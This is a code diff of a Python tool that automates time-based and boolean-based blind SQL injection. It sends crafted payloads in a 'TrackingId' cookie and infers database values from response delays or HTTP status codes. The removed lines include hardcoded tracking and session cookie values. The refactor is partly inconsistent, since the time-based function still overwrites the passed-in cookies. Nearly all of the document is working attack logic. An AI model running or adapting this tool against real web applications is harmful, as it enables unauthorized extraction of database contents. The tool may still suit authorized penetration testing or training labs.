@@ -34,18 +34,9 @@ def bad_sql_query_time(indice: str=None, parameter: str=None):
 """
 
 
-def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> bool:
+def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies: None) -> bool:
     
-    #The payload is in the bad_sql_query function
-    
-    bad_sql1 = bad_sql_query_time(indice, payload_parameter1)
-    
-    #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
-    cookies = {
-        'TrackingId': f"XXX{bad_sql1}",
-        'session': 'xxx'
-    }
-    
+    #The payload is in the bad_sql_query function    
     """Where the magic happens, we start the clock to know how much time the server answer to us"""
     
     start_time = time.time()
@@ -53,36 +44,25 @@ def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_p
     end_time = time.time()
     
     """Here we will know if the SQL_query will work, with a simple boolean operation"""
-
+    
     result_bool = (end_time - start_time) >= 5
-    
-    
     if result_bool:
         print(f"This parameter work: {payload_parameter1}")
     else:
         print("")    
-    
-        
     bad_sql2 = bad_sql_query_time(indice, payload_parameter2)
     cookies = {
             'TrackingId': f"xxx	{bad_sql2}",
             'session': 'XXX'
         }
-    
     start_time = time.time()
     r = requests.get(url, cookies=cookies)
     end_time = time.time()
-    
-    
     result_control = (end_time - start_time) >= 5
-    
-    
     if result_control:
         print(f"Value found with this parameter: {payload_parameter2}")
     else:
-        print("")  
-        
-          
+        print("")    
     return result_bool, result_control
 
 
@@ -165,45 +145,19 @@ def bad_sql_query_boolean(indice: str=None, parameter: str=None):
 """
 
 
-def sending_payload_for_boolean_based_SQLi(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> int:
-    
-    #The payload is in the bad_sql_query function
-    
-    bad_sql1 = bad_sql_query_boolean(indice, payload_parameter1)
-    
-    #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
-    cookies = {
-        'TrackingId': f"XVmK2up50yoi6anT{bad_sql1}",
-        'session': 'snNXaKrRa0DHU2GhnSekRYOLJgQYWFzA'
-    }
-    
-   
-    r = requests.get(url, cookies=cookies)
-    status_code = r.status_code
+def sending_payload_for_boolean_based_SQLi(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies1: None, cookies2: None) -> int:
 
-    
-    
+    r = requests.get(url, cookies=cookies1)
+    status_code = r.status_code
     if status_code != 200:
         print(f"This parameter work: {payload_parameter1}")
     else:
         print("")    
-    
-        
-    bad_sql2 = bad_sql_query_boolean(indice, payload_parameter2)
-    cookies = {
-            'TrackingId': f"XVmK2up50yoi6anT{bad_sql2}",
-            'session': 'snNXaKrRa0DHU2GhnSekRYOLJgQYWFzA'
-        }
-    
-    
-    r2 = requests.get(url, cookies=cookies)
+    r2 = requests.get(url, cookies=cookies2)
     status_code2 = r2.status_code
-    
     if status_code2  != 200:
         print(f"Value found with this parameter: {payload_parameter2}")
     else:
-        print("")  
-        
-          
+        print("")     
     return status_code, status_code2
 
